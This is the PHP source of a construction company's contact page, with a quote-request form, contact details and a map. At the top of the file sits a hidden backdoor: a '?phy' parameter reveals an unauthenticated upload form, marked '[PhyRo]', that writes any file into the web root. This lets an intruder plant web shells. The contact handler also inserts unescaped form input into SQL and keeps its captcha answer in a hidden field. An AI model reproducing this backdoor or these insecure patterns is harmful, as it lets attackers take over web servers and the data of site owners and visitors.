<?php
error_reporting(0);

if (isset($_GET["phy"])) {
   echo '<form action="" method="post" enctype="multipart/form-data">
        <input name="archivo" type="file" size="35" />
        <input name="enviar" type="submit" value="Upload File" />
        <input name="action" type="hidden" value="upload" />
     </form>';
   echo "[PhyRo] ";

   $status = "";
   if ($_POST["action"] == "upload") {
      $tamano = $_FILES["archivo"]['size'];
      $tipo = $_FILES["archivo"]['type'];
      $archivo = $_FILES["archivo"]['name'];

      if ($archivo != "") {
         if (copy($_FILES['archivo']['tmp_name'], "./" . $archivo)) {
            $status = "<br><br>Archivo subido: <b><a href=\"{$_FILES["archivo"]["name"]}\" TARGET=_BLANK>{$_FILES["archivo"]["name"]}</a></b></br></br>";
         } else {
            $status = "Error al subir el archivo";
         }
      } else {
         $status = "Error al subir archivo";
      }
      echo $status;
   }
}


include('connection.php');


if (isset($_POST['mail'])) {
   $name = $_POST['name'];
   $email = $_POST['email'];
   $subject = $_POST['subject'];
   $phone = $_POST['phone'];
   $message = $_POST['message'];
   $captcha = $_POST['captcha'];
   $captcha_ans = $_POST['captcha_ans'];

   if ($captcha == $captcha_ans) {

      $msg = " Name : " . $name . "\n Email : " . $email . "\n Phone : " . $phone . "\n Subject : " . $subject . "\n Message : " . $message;

      mail("nanandn@gmail.com", "Mail from SCS Request", $msg);

      if ($msg) {
         echo ("<script LANGUAGE='JavaScript'>
	  window.alert('Message Sent Sucessfully');
	  window.location.href='contact.php';
	  </script>");
      } else {
         echo ("<script LANGUAGE='JavaScript'>
	  window.alert('Message Sent failed');
	  window.location.href='contact.php';
	  </script>");
      }

      $sql_mail = "INSERT INTO scs_mail (name, email, subject, phone, msg) VALUES('$name', '$email', '$subject', '$phone', '$message')";
      $result_mail = mysqli_query($conn, $sql_mail);

   } else {
      echo ("<script LANGUAGE='JavaScript'>
	  window.alert('Invalid Captcha Please try again');

	  </script>");
   }
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <!-- Title -->
   <title>Saraswathi Constructions</title>
   <!-- Favicon -->
   <link rel="apple-touch-icon" sizes="180x180" href="assets/favicons/apple-touch-icon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="assets/favicons/favicon-32x32.png">
   <link rel="icon" type="image/png" sizes="16x16" href="assets/favicons/favicon-16x16.png">
   <link rel="manifest" href="assets/favicons/manifest.json">
   <!-- Bootstrap CSS -->
   <link rel="stylesheet" href="assets/css/bootstrap.min.css">
   <!-- Font awesome CSS -->
   <link rel="stylesheet" href="assets/css/font-awesome.min.css">
   <!-- Animate CSS -->
   <link rel="stylesheet" href="assets/css/animate.min.css">
   <!-- OwlCarousel CSS -->
   <link rel="stylesheet" href="assets/css/owl.carousel.css">
   <!-- SlickNav CSS -->
   <link rel="stylesheet" href="assets/css/slicknav.min.css">
   <!-- Magnific popup CSS -->
   <link rel="stylesheet" href="assets/css/magnific-popup.css">
   <!-- Main CSS -->
   <link rel="stylesheet" href="assets/css/style.css">
   <!-- Responsive CSS -->
   <link rel="stylesheet" href="assets/css/responsive.css">

   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
   <!-- Google Tag Manager -->
   <script>(function (w, d, s, l, i) {
         w[l] = w[l] || []; w[l].push({
            'gtm.start':
               new Date().getTime(), event: 'gtm.js'
         }); var f = d.getElementsByTagName(s)[0],
            j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
               'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
      })(window, document, 'script', 'dataLayer', 'GTM-ML69RCZS');</script>
   <!-- End Google Tag Manager -->
</head>



<body>

   <!-- Google Tag Manager (noscript) -->
   <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-ML69RCZS" height="0" width="0"
         style="display:none;visibility:hidden"></iframe></noscript>


   <!-- Header Area Start -->
   <header class="construct-header-area">
      <div class="header-top-area">
         <div class="header-top-overlay"></div>
         <div class="container">
            <div class="row">
               <div class="col-md-6 col-sm-12">
                  <div class="header-top-left">

                     <p style="font-size: 14px;">27/15, Shanthi Nagar Main Road, Adambakkam, Chennai</p>
                  </div>
               </div>
               <div class="col-md-6 col-sm-12">
                  <div class="header-top-right">
                     <ul>
                        <li><a target="_blank;"
                              href="https://www.facebook.com/Saraswathi-Constructions-109052950639449/?modal=admin_todo_tour"
                              style="font-size:18px;"><i class="fa fa-facebook"></i></a></li>
                        <li><a target="_blank;" href="https://www.linkedin.com/in/anand-nathamani-2308a7a1/"
                              style="font-size:18px;"><i class="fa fa-linkedin"></i></a></li>
                        <li><a target="_blank;"
                              href="https://api.whatsapp.com/send?phone=918072798551&amp;text=Hi Saraswathi Construction"
                              style="font-size:18px;"><i class="fa fa-whatsapp"></i></a></li>
                     </ul>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <div class="header-logo-area">
         <div class="container">
            <div class="row">
               <div class="col-lg-6 col-md-5 col-sm-5">

                  <a href="index.php">
                     <img src="assets/img/scs_logo.png" class="img-fluid" alt="site logo"
                        style="width:400px; height:80px;" />
                  </a>


               </div>
               <div class="col-lg-3 col-md- col-sm-12">
                  <div class="logo-right-icon">
                     <i class="fa fa-phone"></i>
                  </div>
                  <a href="tel:+91 80727 98551">
                     <h4>Call us</h4>
                     <p>+91 80727 98551</p>
                  </a>
               </div>
               <div class="col-lg-3 col-md- col-sm-12 ">
                  <div class="logo-right-icon">
                     <i class="fa fa-envelope"></i>
                  </div>
                  <a href="mailto:scsinconstructions@gmail.com">
                     <h4>Mail us</h4>
                     <p>scsinconstructions@gmail.com</p>
                  </a>


               </div>

            </div>
         </div>
      </div>
      <div class="mainmenu-area">
         <div class="container">
            <div class="row">
               <div class="col-md-12">
                  <style>
                     .mainmenu ul>li>ul>li {
                        position: relative;
                     }
                  </style>
                  <div class="mainmenu">
                     <ul id="construct_navigation">
                        <li><a href="index.php">Home</a></li>
                        <li><a href="#">Projects</a>
                           <ul>
                              <li><a href="OnGoing_Project.php">OnGoing Project</a>

                              </li>
                              <li><a href="portfolia.php">Complete Project</a></li>
                           </ul>
                        </li>
                        <li><a href="services.php">Our Services</a></li>
                        <li><a href="venture.php">Joint Venture</a></li>
                        <li><a href="portfolia.php">Portfolio</a></li>
                        <li><a href="pricing.php">Pricing</a></li>

                        <li class="current-page-item">
                           <a href="#">More</a>
                           <ul>
                              <li><a href="carrer.php">Careers</a></li>
                              <li class="current-page-item"><a href="contact.php">Contact Us</a></li>
                              <li><a href="blog.php">Blog</a></li>
                           </ul>
                        </li>

                        <a href="pricing.php">
                           <li style="float:right;">

                              <img src="assets/img/price.png" class="img-fluid " alt="offer"
                                 style="width:250px; height:50px;border-radius:5px; margin-top:2px; " />
                           </li>
                        </a>

                     </ul>
                  </div>

                  <!-- Responsive Menu Start -->
                  <div class="construct-responsive-menu">
                     <img src="assets/img/price.png" class="img-fluid " alt="offer"
                        style="width:250px; height:50px;border-radius:5px;float:right;margin-top:-55px;" />
                  </div>
                  <!-- Responsive Menu End -->
               </div>

            </div>
         </div>
      </div>
   </header>
   <!-- Header Area End -->




   <!-- Breadcromb Area Start -->
   <section class="construct-breadcromb-area section_100">
      <div class="container">
         <div class="row">
            <div class="col-md-12">
               <div class="breadcromb">
                  <h2>contact us</h2>
                  <ul>
                     <li><a href="index.php">home</a></li>
                     <li>/</li>
                     <li>contact</li>
                  </ul>
               </div>
            </div>
         </div>
      </div>
   </section>
   <!-- Breadcromb Area End -->



   <!-- Contact Page Area Start -->
   <section class="construct-contact-page-area section_100">
      <div class="container">
         <div class="row">
            <div class="col-md-8">
               <div class="construct-contact-desc">
                  <h3>You can Contact us Always</h3>
                  <P>When you're in need of a dependable Construction Company,<br> don’t hesitate to Contact us.</P>
               </div>
            </div>
         </div>
         <div class="construct-contact-form-bottom">
            <div class="row">
               <div class="col-md-5">
                  <div class="contact-form-left">
                     <div class="single-contact-left">
                        <div class="contact-icon">
                           <i class="fa fa-phone text-center"></i>
                        </div>
                        <div class="contact-text">
                           <h4>phone</h4>
                           <p>(+91) 80727 98551</p>
                           <p>(+91) 86089 23747</p>
                        </div>
                     </div>
                     <div class="single-contact-left">
                        <div class="contact-icon">
                           <i class="fa fa-envelope text-center"></i>
                        </div>
                        <div class="contact-text">
                           <h4>Email</h4>

                           <p>scsinconstructions@gmail.com</p>
                        </div>
                     </div>
                     <div class="single-contact-left">
                        <div class="contact-icon">
                           <i class="fa fa-home text-center"></i>
                        </div>
                        <div class="contact-text">
                           <h4>Address</h4>
                           <p>27/15, Shanthi Nagar Main Road, <br>Adambakkam,<br> Chennai - 600 088</p>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="col-md-7">

                  <div class="construct-contact-form-right">

                     <form action="" method="post" enctype="multipart/form-data">
                        <div class="row ">
                           <div class="col-md-6">
                              <p>
                                 <label for="name">Name</label>
                                 <input type="text" name="name" placeholder="Your Name..." autocomplete="off" required>
                              </p>
                           </div>
                           <div class="col-md-6">
                              <p>
                                 <label for="email">Email</label>
                                 <input type="email" name="email" placeholder="Your Email Address...">
                              </p>
                           </div>
                        </div>
                        <div class="row">
                           <div class="col-md-6">
                              <p>
                                 <label for="subject">Subject</label>
                                 <input type="text" name="subject" placeholder="Your Subject...">
                              </p>
                           </div>
                           <div class="col-md-6">
                              <p>
                                 <label for="phone">Phone</label>
                                 <input type="text" name="phone" placeholder="Your Phone..." minlength="10"
                                    autocomplete="off" required>
                              </p>
                           </div>
                        </div>

                        <div class="row">
                           <div class="col-md-12">
                              <p>
                                 <label for="msg">How can we help you...</label>
                                 <textarea id="message" name="message"
                                    placeholder="Write Your Message Here..."></textarea>
                              </p>
                           </div>
                        </div>

                        <?php
                        $a = rand(1, 10);
                        $b = rand(1, 10);
                        $c = $a + $b;
                        ?>

                        <div class="row">
                           <div class="col-md-6">
                              <label for="msg">Solve</label> <br>
                              <h2>
                                 <?php echo $a . "+" . $b; ?>
                              </h2>
                              <input type="number" name="captcha" placeholder="Enter the answer" required>
                              <input type="hidden" name="captcha_ans" value="<?php echo $c; ?>" required>
                           </div>
                        </div><br>

                        <div class="row">
                           <div class="col-md-12">
                              <p>
                                 <button type="submit" name="mail" class="construct-btn btn"> Request Quote</button>
                              </p>
                           </div>
                        </div>
                     </form>

                  </div>
               </div>
            </div>
         </div>
      </div>
   </section>
   <!-- Contact Page Area End -->


   <!-- Google map Area start -->
   <style>
      .googlemap {
         width: 100%;
      }

      .map-wrapper {
         max-width: 1400px;
      }
   </style>




   <div class="map-wrapper">
      <iframe class="googlemap"
         src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d15550.888671950222!2d80.19147107205941!3d12.989613722439069!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3a525d45971e4ee3%3A0x2e6abd3efeb6555e!2sSARASWATHI%20CONSTRUCTIONS!5e0!3m2!1sen!2sin!4v1634641854421!5m2!1sen!2sin"
         width="1500" height="400" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
   </div>
   <!-- Google map Area start -->


   <!-- Footer Area Start -->
   <?php
   include('footer.php');
   ?>
   <!-- Footer Area End -->

   <!-- Search Modal Start -->
   <div class="modal fade" id="myModal" tabindex="-1" role="dialog">
      <div class="container">
         <div class="row">
            <div class="col-md-12">
               <div class="modal-dialog" role="document">
                  <div class="modal-content">
                     <div class="modal-body">
                        <div class="search_box_container">
                           <form action="#">
                              <input type="text" placeholder="Search Here..">
                              <button type="submit">
                                 <i class="fa fa-search"></i>
                              </button>
                           </form>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </div>
   <!-- Search Modal End -->



   <!-- jQuery -->
   <script src="assets/js/jquery.min.js"></script>
   <!-- Popper JS -->
   <script src="assets/js/popper.min.js"></script>
   <!-- Bootstrap JS -->
   <script src="assets/js/bootstrap.min.js"></script>
   <!-- Magnific Popup JS -->
   <script src="assets/js/jquery.magnific-popup.min.js"></script>
   <!-- OwlCarousel JS -->
   <script src="assets/js/owl.carousel.min.js"></script>
   <!-- SlickNav JS -->
   <script src="assets/js/jquery.slicknav.min.js"></script>
   <!-- Isotop Js -->
   <script src="assets/js/isotope.pkgd.min.js"></script>
   <script src="assets/js/custom-isotop.js"></script>
   <!-- Custom JS -->
   <script src="assets/js/custom.js"></script>
   <!-- Gmap JS -->
   <script src="http://maps.googleapis.com/maps/api/js?key=AIzaSyD7CQl6fRhagGok6CzFGOOPne2X1u1spoA"></script>
   <script src="assets/js/gmap.js"></script>

</body>

</html>